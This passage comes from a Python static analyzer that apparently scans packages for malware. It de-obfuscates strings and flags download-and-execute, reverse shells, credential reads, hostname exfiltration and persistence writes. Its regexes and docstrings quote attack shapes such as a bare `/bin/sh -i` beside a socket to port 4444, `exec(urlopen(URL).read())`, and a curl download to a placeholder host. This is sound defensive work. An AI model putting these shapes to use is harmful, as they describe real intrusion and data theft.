            # at all -- `("ghp_" "rest")` is one `Constant` to the parser and
            # two separated literals in the source -- so the contiguous pattern
            # never sees the joined value while the interpreter only ever sees
            # the joined value. Anything the byte scan did find is already in
            # the caller's `seen` set and is dropped there.
            folded = cls.constant(value)
            if folded is None:
                continue

            found.append(
                Assembled(
                    value=folded,
                    line=getattr(value, "lineno", 1),
                    name=targets[0] if targets else None,
                    assembled=not isinstance(value, ast.Constant),
                )
            )

        return found

    @staticmethod
    def parses(source: str) -> bool:
        """Whether this is Python the analyzer could read.

        Asked separately so the caller can report a file it could not analyse
        rather than quietly treating an unreadable file as an uninteresting
        one."""
        try:
            ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return False
        return True

    # -- Name resolution -------------------------------------------------

    def _collect_names(self, tree: ast.AST) -> None:
        """Build the alias and binding maps before evaluating any call.

        Two passes because a module may bind a name after using it inside a
        function body, and the function runs later. Order in the file is not
        order of execution, and matching on the first would miss the ordinary
        case of a helper defined above its imports.
        """
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign) and any(
                isinstance(n, ast.Name) and n.id == "__file__" for n in ast.walk(node.value)
            ):
                self._bundled_paths.update(t.id for t in node.targets if isinstance(t, ast.Name))
        for node in ast.walk(tree):
            # Names holding the text of a local file: `l` in `for l in open(...)`, `t = open(...)
            # .read()`, `t = Path(...).read_text()`.
            source = (
                node.iter
                if isinstance(node, ast.For) and isinstance(node.target, ast.Name)
                else node.value
                if isinstance(node, ast.Assign)
                else None
            )
            if source is not None and self._is_local_read(source):
                target = node.target if isinstance(node, ast.For) else None
                names = (
                    [target.id]
                    if isinstance(target, ast.Name)
                    else [t.id for t in getattr(node, "targets", []) if isinstance(t, ast.Name)]
                )
                self._local_reads.update(names)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    self._aliases[alias.asname or alias.name] = alias.name
            elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
                for alias in node.names:
                    self._aliases[alias.asname or alias.name] = f"{node.module}.{alias.name}"
            elif isinstance(node, ast.Assign) and len(node.targets) == 1:
                target = node.targets[0]
                if isinstance(target, ast.Name):
                    dotted = self._dotted(node.value)
                    if dotted:
                        self._bindings[target.id] = dotted
                    literal = self.constant(node.value)
                    if literal is not None:
                        # A second, different assignment makes the value unknowable statically.
                        known = self._strings.get(target.id, literal)
                        self._strings[target.id] = literal if known == literal else None
                    elif isinstance(node.value, ast.JoinedStr | ast.BinOp):
                        # A built string, kept for `_sketch`; assigned twice, it is not one thing.
                        if target.id in self._sketched:
                            self._sketches.pop(target.id, None)
                        else:
                            self._sketches[target.id] = node.value
                        self._sketched.add(target.id)
                elif (
                    isinstance(target, ast.Tuple)
                    and isinstance(node.value, ast.Tuple)
                    and len(target.elts) == len(node.value.elts)
                ):
                    # `a, b = eval("exec"), eval("compile")` binds each name as its own
                    # assignment would.
                    for name, value in zip(target.elts, node.value.elts, strict=True):
                        dotted = self._dotted(value) if isinstance(name, ast.Name) else None
                        if isinstance(name, ast.Name) and dotted:
                            self._bindings[name.id] = dotted
            elif (
                isinstance(node, ast.For)
                and isinstance(node.target, ast.Name)
                and self._is_literal_strings(node.iter)
            ):
                # A loop over a literal list of strings. Every value the variable can
                # take is written out above it, so a call through it is not a name this
                # file withholds -- which is the whole of what the dynamic-dispatch
                # label claims.
                #
                # `odysseus` ends its `setup.py` with a dependency check:
                # `for mod in ["fastapi", "uvicorn", ...]: try: __import__(mod)`, and it
                # was reported at CRITICAL as install-time code reaching a function by a
                # computed name. Six names, all of them legible.
                self._enumerated.add(node.target.id)

    @classmethod
    def _is_literal_strings(cls, node: ast.AST) -> bool:
        """Whether this expression is a list, tuple or set of string literals.

        Not a general evaluator: only the written-out form, where reading the file is
        reading the values. A name bound to a list elsewhere is not followed, because
        the next thing to follow would be a list that is appended to, and then one
        built from a network response.
        """
        if not isinstance(node, ast.List | ast.Tuple | ast.Set):
            return False
        return bool(node.elts) and all(
            isinstance(element, ast.Constant) and isinstance(element.value, str)
            for element in node.elts
        )

    def _dotted(self, node: ast.AST) -> str | None:
        """The dotted name an expression refers to, unwinding aliases.

        `b.b64decode` where `b` is `base64` becomes `base64.b64decode`; `go`
        where `go` is `subprocess.run` becomes `subprocess.run`.
        """
        if isinstance(node, ast.Name):
            return self._aliases.get(node.id) or self._bindings.get(node.id) or node.id
        if isinstance(node, ast.Attribute):
            base = self._dotted(node.value)
            if base in BUILTIN_MODULES:
                # `builtins.exec` is `exec`: the module is how the name is reached, not part of it.
                return node.attr
            return f"{base}.{node.attr}" if base else None
        if isinstance(node, ast.Call) and node.args:
            # `__import__("base64")` and `importlib.import_module("base64")` evaluate to the module,
            # so `__import__("base64").b64decode` is `base64.b64decode` -- the spelling droppers use
            # to keep `import base64` and `exec(` off the same page.
            callee = self._dotted(node.func)
            if callee in ("__import__", "importlib.import_module"):
                module = self.constant(node.args[0])
                if module:
                    return module
            if callee == "eval":
                return self._evaluated_name(node.args[0])
        return None

    def _evaluated_name(self, node: ast.AST) -> str | None:
        """What `eval` of this argument names, when the argument is written in the file.

        `eval("exec")` is the builtin `exec`, and `eval(compile("__import__('base64')", "", "eval"))`
        is the module `base64`: an obfuscator's way of reaching both without the name appearing in
        the code. Only an expression that is itself a name, an attribute or an import is followed;
        anything that computes a value is not a name and is left to the dynamic-dispatch check.
        """
        if isinstance(node, ast.Call) and self._dotted(node.func) == "compile" and node.args:
            node = node.args[0]
        source = self.constant(node)
        if source is None or len(source) > 200:
            return None
        try:
            expression = ast.parse(source.strip(), mode="eval").body
        except (SyntaxError, ValueError, RecursionError):
            return None
        if isinstance(expression, ast.Name | ast.Attribute | ast.Call):
            return self._dotted(expression)
        return None

    # -- Constant folding ------------------------------------------------

    @classmethod
    def constant(cls, node: ast.AST) -> str | None:
        """The string an expression evaluates to, if it is derivable statically.

        Handles the shapes that hide a name: adjacent literals, `+` chains,
        `"".join([...])` and f-strings whose parts are all constant. Anything
        else returns None, which is the signal that the target is genuinely
        computed at runtime.
        """
        if isinstance(node, ast.Constant):
            return node.value if isinstance(node.value, str) else None
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left, right = cls.constant(node.left), cls.constant(node.right)
            return None if left is None or right is None else left + right
        if isinstance(node, ast.JoinedStr):
            parts = [cls.constant(value) for value in node.values]
            return None if any(part is None for part in parts) else "".join(p or "" for p in parts)
        if isinstance(node, ast.FormattedValue):
            return cls.constant(node.value)
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "join"
            and len(node.args) == 1
        ):
            separator = cls.constant(node.func.value)
            elements = node.args[0]
            if separator is not None and isinstance(elements, ast.List | ast.Tuple):
                parts = [cls.constant(element) for element in elements.elts]
                if all(part is not None for part in parts):
                    return separator.join(part or "" for part in parts)
            # `"".join([chr(x) for x in [47, 101, ...]])`: the same, as a comprehension.
            if (
                separator is not None
                and isinstance(elements, ast.ListComp | ast.GeneratorExp)
                and len(elements.generators) == 1
                and not elements.generators[0].ifs
                and isinstance(elements.generators[0].target, ast.Name)
                and isinstance(elements.generators[0].iter, ast.List | ast.Tuple)
                and len(elements.generators[0].iter.elts) <= MAX_FOLDED_CODES
                and isinstance(elements.elt, ast.Call)
                and isinstance(elements.elt.func, ast.Name)
                and elements.elt.func.id == "chr"
                and len(elements.elt.args) == 1
                and isinstance(elements.elt.args[0], ast.Name)
                and elements.elt.args[0].id == elements.generators[0].target.id
            ):
                codes = [cls._code_point(e) for e in elements.generators[0].iter.elts]
                if all(c is not None for c in codes):
                    return separator.join(chr(c) for c in codes if c is not None)
            # `"".join(map(chr, [102, 114, 111, 109, ...]))`: code spelled as character codes.
            if (
                separator is not None
                and isinstance(elements, ast.Call)
                and isinstance(elements.func, ast.Name)
                and elements.func.id == "map"
                and len(elements.args) == 2
                and isinstance(elements.args[0], ast.Name)
                and elements.args[0].id == "chr"
                and isinstance(elements.args[1], ast.List | ast.Tuple)
                and len(elements.args[1].elts) <= MAX_FOLDED_CODES
            ):
                codes = [cls._code_point(e) for e in elements.args[1].elts]
                if all(c is not None for c in codes):
                    return separator.join(chr(c) for c in codes if c is not None)
        # `chr(102)`, one character at a time.
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id == "chr"
            and len(node.args) == 1
        ):
            code = cls._code_point(node.args[0])
            if code is not None:
                return chr(code)
        return None

    @staticmethod
    def _code_point(node: ast.AST) -> int | None:
        if (
            isinstance(node, ast.Constant)
            and type(node.value) is int
            and 0 <= node.value <= 0x10FFFF
        ):
            return node.value
        return None

    WRITABLE_TARGET = re.compile(
        r"""(?:^|[\s"'=])(?:\./|\.\\|/tmp/|/var/tmp/|/dev/shm/|%TEMP%|\$TMPDIR|\$HOME/\.)""",
    )
    """Paths a dropper writes its payload to.

    A constant argv naming one of these is not the reassurance the rest of
    `fixed_command` is: the command is fixed and the FILE it runs is not, because
    whatever ran before it created that file."""

    BARE_SHELL = re.compile(
        r"""(?ix)
        ^[ \t]*
        (?:[\w.-]{0,40}[/\\]){0,4}
        (?:sh|bash|zsh|ksh|dash|ash|csh|tcsh|fish|cmd|powershell|pwsh)
        (?:\.exe)?
        (?:[ \t]{1,4}-{1,2}[il]{1,2}\b){0,3}
        [ \t]*$
        """,
    )
    """A constant argv that is a shell and nothing else.

    The discount `fixed_command` applies rests on one claim: a spawn whose whole
    command is visible cannot be running something decoded or downloaded. That
    holds for `["git", "rev-parse", "HEAD"]` and fails completely for
    `["/bin/sh", "-i"]`, where the literal IS the act -- what such a shell runs
    arrives over whatever its file descriptors were wired to, which is the whole
    construction of a reverse shell.

    Measured: `subprocess.call(["/bin/sh", "-i"])` next to
    `socket.connect(("<literal ip>", 4444))` produced no finding at all, because
    the spawn half was discounted here and `MALWARE.REVERSE_SHELL.001` needs
    both. The pattern tier's hit on the same line was dropped with it, by line.

    `sh -c "<command>"` is deliberately NOT this shape: it carries its command,
    the embedded-shell tier extracts it, and the discount stays correct there."""

    @classmethod
    def _fixed_command(cls, node: ast.Call) -> bool:
        """Whether every argument of this spawn was written out in the source."""
        if not node.args:
            return False
        first = node.args[0]
        if isinstance(first, ast.List | ast.Tuple):
            parts = [cls.constant(element) for element in first.elts]
            if not parts or any(part is None for part in parts):
                return False
            resolved = " ".join(part for part in parts if part is not None)
        else:
            single = cls.constant(first)
            if single is None:
                return False
            resolved = single
        if cls.BARE_SHELL.match(resolved):
            return False
        if SCRIPT_LAUNCH.search(resolved):
            # `os.system("start main.cpython-39.vbs")`: literal, and what it runs is a file whose
            # content is not in the command -- where a dropper that brought its payload with it
            # puts it. `subprocess.run(["git", "rev-parse"])` names a tool, not a file.
            return False
        return cls.WRITABLE_TARGET.search(resolved) is None

    def _command(self, node: ast.Call) -> str | None:
        """The command a spawn primitive is being handed.

        Both call shapes are accepted. `os.system("...")` carries the command
        as one string; `subprocess.run(["sh", "-c", "..."])` splits it across a
        sequence, and the parts are rejoined because it is the whole line that
        has to be matched against, not any single argument of it.

        Folded through variables and f-strings, with what cannot be known kept as `{name}`:
        `download = f'curl.exe -L https://h/x.exe -o "{out}"'` handed on as `["powershell",
        "-Command", download]` is still a `curl` the shell rules can read.
        """
        if not node.args:
            return None
        first = node.args[0]
        if isinstance(first, ast.List | ast.Tuple):
            parts = [self._sketch(element) for element in first.elts]
            if all(part is None for part in parts):
                return None
            return " ".join(part for part in parts if part is not None)
        return self._sketch(first)

    def _sketch(self, node: ast.AST, depth: int = 0) -> str | None:
        """A string expression with its unknown parts written `{name}`, or None if it has no
        literal text at all."""
        if depth > 4:
            return None
        literal = self.constant(node)
        if literal is not None:
            return literal
        if isinstance(node, ast.JoinedStr):
            pieces = []
            for value in node.values:
                part = self.constant(value)
                if part is None and isinstance(value, ast.FormattedValue):
                    inner = value.value
                    part = (
                        self._strings.get(inner.id)
                        or (self._sketch(inner, depth + 1) if inner.id in self._sketches else None)
                        or f"{{{inner.id}}}"
                        if isinstance(inner, ast.Name)
                        else "{?}"
                    )
                pieces.append(part or "")
            return "".join(pieces)
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left, right = self._sketch(node.left, depth + 1), self._sketch(node.right, depth + 1)
            if left is None and right is None:
                return None
            return (left or "{?}") + (right or "{?}")
        if isinstance(node, ast.Name):
            bound = self._sketches.get(node.id)
            if bound is not None:
                return self._sketch(bound, depth + 1)
        return None

    # -- The walk --------------------------------------------------------

    def _walk(self, tree: ast.AST) -> None:
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Call | ast.Subscript):
                # A subscript as well as a call. `globals()["exec"]()` invokes what the
                # subscript returned, and the map existed only for `getattr(...)()`.
                self._invoked[id(node.func)] = node

        keyed = self._keyed_environment_reads(tree)

        called = {id(node.func) for node in ast.walk(tree) if isinstance(node, ast.Call)}
        """The function of every call, which `_call` has already judged.

        `os.getenv` is both a primitive and an `Attribute`, so a single
        `os.getenv("GH_TOKEN")` was recorded twice: once by `_call` and again by
        the branch below, which exists for `os.environ` -- a primitive that is
        never called. vLLM's `setup.py` line 1112 reads
        `os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))` and produced four
        identical credential hits at one span. Reading a function without calling
        it is not the act the primitive describes."""

        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                self._call(node)
                self._written_code(node)
            elif isinstance(node, ast.Attribute | ast.Name):
                # `os.environ` is a primitive without being called.
                dotted = self._dotted(node)
                if id(node) in called:
                    continue
                if dotted in PRIMITIVES and PRIMITIVES[dotted] is Capability.CREDENTIAL:
                    if id(node) in keyed and not CREDENTIAL_VARIABLE.search(keyed[id(node)]):
                        # `os.environ["PORT"]`. The whole mapping was never
                        # reached for; one named setting was. See
                        # `CREDENTIAL_VARIABLE`.
                        continue
                    self._record(PRIMITIVES[dotted], node, dotted)
            elif isinstance(node, ast.Subscript):
                self._subscript(node)

    def _written_code(self, node: ast.Call) -> None:
        """Python source written to a file, analysed as the code it is.

        `tmp.write(b"from urllib.request import urlopen;exec(urlopen(URL).read())")` followed by
        running the file is a download-and-execute whose every primitive sits inside a literal, out
        of reach of an analysis that reads only the calls of the file itself. The literal's own calls
        are recorded at the `write` that puts them on disk, so the same composites that judge inline
        code judge it. Only a write's argument is read: a docstring example or a template that is
        never written is not code anyone runs. A literal nested in a written literal is shorter
        than it, so the recursion ends.

        A literal handed straight to `exec` is read the same way: `exec('import urllib.request as
        u;...')` keeps every primitive out of the file's own calls just as well.
        """
        if not node.args or not self._follow_literals:
            return
        written = isinstance(node.func, ast.Attribute) and node.func.attr in WRITE_METHODS
        if not written and self._dotted(node.func) not in ("exec", "eval", "compile"):
            return
        value = self._written_text(node.args[0])
        if (
            value is None
            or not WRITTEN_CODE_MIN <= len(value) <= WRITTEN_CODE_MAX
            or "(" not in value
        ):
            return
        try:
            inner_tree = ast.parse(value)
        except (SyntaxError, ValueError, RecursionError):
            return
        inner = type(self)()
        inner._collect_names(inner_tree)
        if not written:
            # `exec` with no namespace of its own runs in the caller's, so the literal sees the
            # file's imports: `import subprocess as s` and then `exec("s.run(...)")`.
            inner._aliases = {**self._aliases, **inner._aliases}
        inner._walk(inner_tree)
        for hit in inner._hits:
            label = "written code" if written else "executed literal"
            self._record(
                hit.capability, node, f"{label}: {hit.detail}", hit.command, fixed=hit.fixed_command
            )

    def _egress_call(self, node: ast.AST) -> bool:
        if not isinstance(node, ast.Call):
            return False
        resolved = self._resolve_callee(node)
        return resolved is not None and PRIMITIVES.get(resolved[0]) is Capability.EGRESS

    def _file_key(self, node: ast.AST) -> str | None:
        """A file named the same way twice: the literal path, or the variable holding it."""
        literal = self.constant(node)
        if literal is None and isinstance(node, ast.Name):
            literal = self._strings.get(node.id) or f"name:{node.id}"
        return literal or None

    def _downloaded_and_run(self, tree: ast.AST) -> None:
        """A process started on the file a download just wrote.

        `urlretrieve(URL, "/tmp/x.pyz")` then `subprocess.Popen(["python3", "/tmp/x.pyz"])` runs
        what the remote host served, as surely as `curl | sh` -- but each half alone is ordinary:
        installers download, and tools start processes. The link is the file both calls name, so
        that is what is checked: a spawn whose argument list names a file that was the target of a
        download, or that was opened for writing and written from a network response.
        """
        fetched: set[str] = set()
        downloaded: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign) and self._egress_call(node.value):
                fetched.update(t.id for t in node.targets if isinstance(t, ast.Name))
            elif isinstance(node, ast.With | ast.AsyncWith):
                for item in node.items:
                    if self._egress_call(item.context_expr) and isinstance(
                        item.optional_vars, ast.Name
                    ):
                        fetched.add(item.optional_vars.id)
        # A download run as a command: `curl -o X`, `wget -O X`, `Invoke-WebRequest -OutFile X`.
        # And a command's captured output kept for later: `r = run(["curl", URL])`.
        fetched_output: set[str] = set()
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.SPAWN:
                continue
            command = self._command(resolved[1]) or ""
            download = DOWNLOAD_TO.search(command)
            if download:
                downloaded.add(_word_key(download.group("target")))
                # The download is the request: `curl.exe -L URL -o X` reaches the network
                # whatever the shell patterns make of the binary's name.
                self._record(Capability.EGRESS, node, f"{resolved[0]} downloads to a file")
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign) and isinstance(node.value, ast.Call):
                spawned = self._resolve_callee(node.value)
                if spawned and PRIMITIVES.get(spawned[0]) is Capability.SPAWN:
                    command = self._command(spawned[1]) or ""
                    if FETCH_TOOL.match(command) and not DOWNLOAD_TO.search(command):
                        fetched_output.update(t.id for t in node.targets if isinstance(t, ast.Name))
        writers: dict[str, str] = {}
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            callee = self._dotted(node.func)
            if (
                callee in ("urllib.request.urlretrieve", "urllib.urlretrieve")
                and len(node.args) > 1
            ):
                key = self._file_key(node.args[1])
                if key:
                    downloaded.add(key)
            elif callee == "open" and node.args:
                mode = self.constant(node.args[1]) if len(node.args) > 1 else None
                key = self._file_key(node.args[0])
                if key and mode and ("w" in mode or "a" in mode):
                    writers[f"{getattr(node, 'lineno', 0)}:{getattr(node, 'col_offset', 0)}"] = key
        for node in ast.walk(tree):
            # `with open(P, "wb") as out: out.write(response.read())` and
            # `open(P, "wb").write(r.content)`, where `response` or `r` came from a request.
            if not (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr in WRITE_METHODS
                and node.args
            ):
                continue
            from_network = any(
                (isinstance(part, ast.Name) and part.id in fetched) or self._egress_call(part)
                for part in ast.walk(node.args[0])
            )
            if not from_network:
                continue
            target = node.func.value
            if isinstance(target, ast.Call) and self._dotted(target.func) == "open":
                key = writers.get(
                    f"{getattr(target, 'lineno', 0)}:{getattr(target, 'col_offset', 0)}"
                )
                if key:
                    downloaded.add(key)
            elif isinstance(target, ast.Name):
                downloaded.update(self._handles_opened_on(tree, target.id, writers))
        if not downloaded and not fetched_output:
            return
        executable_download = any(EXECUTABLE_NAME.search(key) for key in downloaded)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.SPAWN:
                continue
            call = resolved[1]
            if call.args and self._runs_one_of(call.args[0], downloaded):
                self._record(Capability.FETCH_EXEC, node, f"{resolved[0]} runs a downloaded file")
            elif call.args and executable_download and self._starts_an_executable(call):
                # A download saved as `main.exe`, moved, then started under its new name: the
                # rename breaks the link by path, not the shape -- a fetched executable, run.
                self._record(
                    Capability.FETCH_EXEC, node, f"{resolved[0]} runs a downloaded program"
                )
            elif call.args and self._evaluates_output(call.args[0], fetched_output):
                self._record(Capability.FETCH_EXEC, node, f"{resolved[0]} evaluates fetched text")

    def _starts_an_executable(self, call: ast.Call) -> bool:
        text = self._command(call) or self.constant(call.args[0]) or ""
        return EXECUTABLE_NAME.search(text) is not None

    def _is_recon_call(self, node: ast.AST) -> bool:
        """A call that returns who or where this machine is: `socket.gethostname()`, or a process
        spawned to say so -- `subprocess.getoutput("whoami")`, `check_output(["hostname"])`."""
        if not isinstance(node, ast.Call):
            return False
        resolved = self._resolve_callee(node)
        if resolved is None:
            return False
        capability = PRIMITIVES.get(resolved[0])
        if capability is Capability.RECONNAISSANCE:
            return True
        if capability is not Capability.SPAWN:
            return False
        command = self._command(node) or ""
        first = command.strip().split(" ", 1)[0].rsplit("/", 1)[-1].lower()
        return first.removesuffix(".exe") in IDENTITY_COMMANDS

    def _identity_sent(self, tree: ast.AST) -> None:
        """The machine's identity, in the arguments of a request.

        `requests.post(URL, json={"user": getpass.getuser(), "host": socket.gethostname()})`, or
        the same through a variable. Reading a hostname and making a request somewhere in the same
        thirty lines is what a telemetry plugin, a socket demo and a browser installer all do;
        putting the hostname in the request is the probe.
        """
        carrying: set[str] = set()
        for _ in range(3):
            for node in ast.walk(tree):
                if isinstance(node, ast.Assign) and any(
                    self._is_recon_call(part)
                    or (isinstance(part, ast.Name) and part.id in carrying)
                    for part in ast.walk(node.value)
                ):
                    carrying.update(t.id for t in node.targets if isinstance(t, ast.Name))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            if resolved[0] in DNS_LOOKUPS and all(
                self._is_recon_call(a) or (isinstance(a, ast.Name) and a.id in carrying)
                for a in node.args[:1]
            ):
                # Looking up this machine's own name sends it to a resolver, not to anyone
                # who collects it; a name built into another domain is what DNS exfiltration is.
                continue
            if any(
                self._is_recon_call(part) or (isinstance(part, ast.Name) and part.id in carrying)
                for argument in arguments
                for part in ast.walk(argument)
            ):
                self._record(Capability.RECONNAISSANCE, node, f"identity sent: {resolved[0]}")

    @staticmethod
    def _is_local_read(node: ast.AST) -> bool:
        """`open(<no URL>)`, optionally `.read()`/`.readlines()`/`.strip()` on it, or
        `<path>.read_text()`."""
        current = node
        while (
            isinstance(current, ast.Call)
            and isinstance(current.func, ast.Attribute)
            and (
                current.func.attr
                in ("read", "readlines", "strip", "splitlines", "decode", "read_text")
            )
        ):
            if current.func.attr == "read_text":
                return True
            current = current.func.value
        if not (
            isinstance(current, ast.Call)
            and isinstance(current.func, ast.Name)
            and current.func.id == "open"
        ):
            return False
        literals = [
            n.value
            for n in ast.walk(current)
            if isinstance(n, ast.Constant) and isinstance(n.value, str)
        ]
        return not any("://" in value for value in literals)

    def _read_from_local_file(self, node: ast.AST) -> bool:
        """Whether every name in this expression holds text read from a local file, rather than
        from anywhere that could be remote."""
        names = [n.id for n in ast.walk(node) if isinstance(n, ast.Name)]
        return bool(names) and all(name in self._local_reads for name in names)

    def _loads_a_bundled_file(self, node: ast.Call, dotted: str) -> bool:
        """`torch.load(os.path.join(os.path.dirname(__file__), "model.pt"), weights_only=False)`:
        a pickle shipped beside the module, deserialised -- which runs whatever the pickle names.

        `torch.load` counts only with `weights_only=False` written out, the switch that turns its
        safe loader off. The pickle-family loaders have no safe mode, so for them a path built from
        `__file__` is enough. A path from anywhere else is a user's own file, which is what these
        loaders are for."""
        if dotted == "torch.load":
            unsafe = any(
                k.arg == "weights_only"
                and isinstance(k.value, ast.Constant)
                and k.value.value is False
                for k in node.keywords
            )
            if not unsafe:
                return False
        argument = node.args[0] if node.args else None
        if argument is None:
            return False
        if isinstance(argument, ast.Call) and self._dotted(argument.func) == "open":
            argument = argument.args[0] if argument.args else argument
        names = {n.id for n in ast.walk(argument) if isinstance(n, ast.Name)}
        if isinstance(argument, ast.Name) and argument.id in self._bundled_paths:
            return True
        return "__file__" in names

    def _opened_for_persistence(self, node: ast.Call) -> None:
        """`open(<a shell profile, LaunchAgent, crontab or systemd user unit>, "a")`.

        The pattern tier reads paths written out; one assembled at runtime -- bo3to builds
        `/home/<user>/.profile` from character codes and appends to it for every user in
        `/etc/passwd` -- is only legible once folded.
        """
        mode = self.constant(node.args[1]) if len(node.args) > 1 else None
        mode = mode or next(
            (self.constant(k.value) for k in node.keywords if k.arg == "mode"), None
        )
        if not mode or not any(flag in mode for flag in "wa"):
            return
        path = self._sketch(node.args[0])
        if path and PERSISTENCE_PATH.search(path):
            self._record(Capability.PERSIST, node, f"open: {path[-60:]}")

    def _evaluates_output(self, argv: ast.AST, fetched: set[str]) -> bool:
        """`run(["node", "-e", r.stdout])` where `r` holds a download's output."""
        if not fetched or not isinstance(argv, ast.List | ast.Tuple) or len(argv.elts) < 3:
            return False
        program = posixpath.basename(self.constant(argv.elts[0]) or "").lower()
        flag = self.constant(argv.elts[1]) or ""
        code = argv.elts[2]
        source = code.value if isinstance(code, ast.Attribute) else code
        return (
            program in INTERPRETER_NAMES
            and flag in ("-e", "-c", "--eval", "-Command", "-command", "/c")
            and isinstance(source, ast.Name)
            and source.id in fetched
        )

    def _runs_one_of(self, argv: ast.AST, files: set[str]) -> bool:
        """Whether this command runs one of these files: as the program, or as the script an
        interpreter is handed. `tar xzf tool.tgz` names a downloaded file and runs nothing of it."""
        if isinstance(argv, ast.List | ast.Tuple):
            texts: list[str | None] = [
                self._dotted(e)
                if isinstance(e, ast.Attribute)
                # A name bound to one literal is that literal, as `_file_key` reads it.
                else (self._strings.get(e.id) or self._sketch(e) or f"{{{e.id}}}")
                if isinstance(e, ast.Name)
                else self._sketch(e)
                for e in argv.elts
            ]
        else:
            text = self._sketch(argv)
            if text is None:
                return self._file_key(argv) in files
            texts = list(text.split())
        return self._words_run(texts, files, depth=0)

    def _words_run(self, words: Sequence[str | None], files: set[str], depth: int) -> bool:
        """Whether a command, as words, runs one of these files."""
        present = [w for w in words if w]
        if not present or depth > 2:
            return False
        if _word_key(present[0]) in files:
            return True
        program = posixpath.basename(present[0].strip("\"'")).lower()
        if program in SHELL_NAMES:
            # `powershell -Command "<cmd>"`, `sh -c "<cmd>"`: the command is more words.
            for index, word in enumerate(present[1:], start=1):
                if word.lower() in ("-c", "-command", "/c"):
                    return self._words_run(" ".join(present[index + 1 :]).split(), files, depth + 1)
        if program == "sys.executable" or program in INTERPRETER_NAMES or program in RUNNER_WORDS:
            script = next((w for w in present[1:] if not w.startswith("-")), None)
            return script is not None and _word_key(script) in files
        return False

    def _handles_opened_on(self, tree: ast.AST, handle: str, writers: dict[str, str]) -> set[str]:
        """The files a `with open(...) as <handle>` in this tree opened for writing."""
        keys: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.With | ast.AsyncWith):
                for item in node.items:
                    expression = item.context_expr
                    if (
                        isinstance(item.optional_vars, ast.Name)
                        and item.optional_vars.id == handle
                        and isinstance(expression, ast.Call)
                    ):
                        key = writers.get(
                            f"{getattr(expression, 'lineno', 0)}:{getattr(expression, 'col_offset', 0)}"
                        )
                        if key:
                            keys.add(key)
        return keys

    def _written_text(self, node: ast.AST) -> str | None:
        """The text a write puts on disk, when the file states it: a literal, or base64 of one.

        `f.write(base64.b64decode(PAYLOAD))` with `PAYLOAD` a literal is decoded here -- decoding,
        never running -- because a payload kept encoded until the moment it is written is the
        ordinary form of the drop-and-run step, and its contents are the evidence.
        """
        if isinstance(node, ast.IfExp):
            # `exec("s.run('s.exe')" if sys.platform == "win32" else "pass")`: both branches are
            # code the file can run, and the one doing something is the one that matters.
            branches = [self._written_text(node.body), self._written_text(node.orelse)]
            return max((b for b in branches if b), key=len, default=None)
        if isinstance(node, ast.Constant):
            value = node.value
            if isinstance(value, bytes):
                return value.decode("utf-8", "replace")
            return value if isinstance(value, str) else None
        if (
            not isinstance(node, ast.Call)
            or not node.args
            or self._dotted(node.func) not in BASE64_DECODERS
        ):
            # A value the folder can compute -- `"".join(map(chr, [...]))` -- is still a literal.
            return self.constant(node)
        argument = node.args[0]
        encoded = (
            self._strings.get(argument.id)
            if isinstance(argument, ast.Name)
            else self.constant(argument)
        )
        if isinstance(argument, ast.Constant) and isinstance(argument.value, bytes):
            encoded = argument.value.decode("ascii", "replace")
        if not encoded or len(encoded) > WRITTEN_CODE_MAX * 2:
            return None
        decode = (
            base64.urlsafe_b64decode
            if "urlsafe" in (self._dotted(node.func) or "")
            else base64.b64decode
        )
        try:
            return decode(encoded + "=" * (-len(encoded) % 4)).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            return None

    def _keyed_environment_reads(self, tree: ast.AST) -> dict[int, str]:
        """Environment nodes that are read with one literal key, and that key.

        The judgement has to be made at the PARENT: `os.environ` and
        `os.environ["PATH"]` contain the same `Attribute` node, so the bare-name
        branch of the walk cannot tell a whole-environment read from a single
        setting without looking up. A node absent from this map was either used
        as a whole mapping -- passed somewhere, copied, iterated, unpacked -- or
        subscripted with something computed, and both of those are the broad
        access.
        """
        keyed: dict[int, str] = {}
        written: set[int] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if (
                        isinstance(target, ast.Subscript)
                        and self._dotted(target.value) in ENVIRONMENT
                    ):
                        # `os.environ["X"] = "1"` SETS a variable. Reading the
                        # environment is what this primitive is about, and a Google
                        # Workspace setup script in `NousResearch/hermes-agent` was
                        # reported for exfiltration on the strength of
                        # `os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"`.
                        written.add(id(target.value))

        candidates = self._iterated_literals(tree)
        for node_id in self._environment_handed_to_children(tree):
            keyed[node_id] = ""

        def key_of(node: ast.AST) -> str | None:
            # A literal, or a loop variable drawn from a literal sequence of names --
            # `for n in ("http_proxy", "HTTPS_PROXY"): os.environ[n]`, which is how nodeenv
            # passes proxy settings on. Every candidate is judged, joined, so one name that
            # reads as a credential keeps the read a credential read.
            key = self.constant(node)
            if key is None and isinstance(node, ast.Name) and node.id in candidates:
                return " ".join(candidates[node.id])
